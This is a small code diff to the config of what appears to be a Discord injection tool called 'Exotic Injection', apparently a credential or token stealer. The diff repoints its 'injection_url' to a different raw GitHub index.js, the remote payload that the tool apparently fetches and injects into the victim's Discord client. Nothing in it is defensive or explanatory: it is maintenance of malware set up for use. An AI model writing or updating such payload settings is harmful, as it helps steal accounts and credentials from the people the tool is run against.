@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Exotic Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1131699115286331564/1134851863599120484/9622684a7361df8199191058b8c60916.mp4'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Reyman101/cositis/main/update/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/roadhooog/shop3/main/index.js', 
   /**
    
    **/
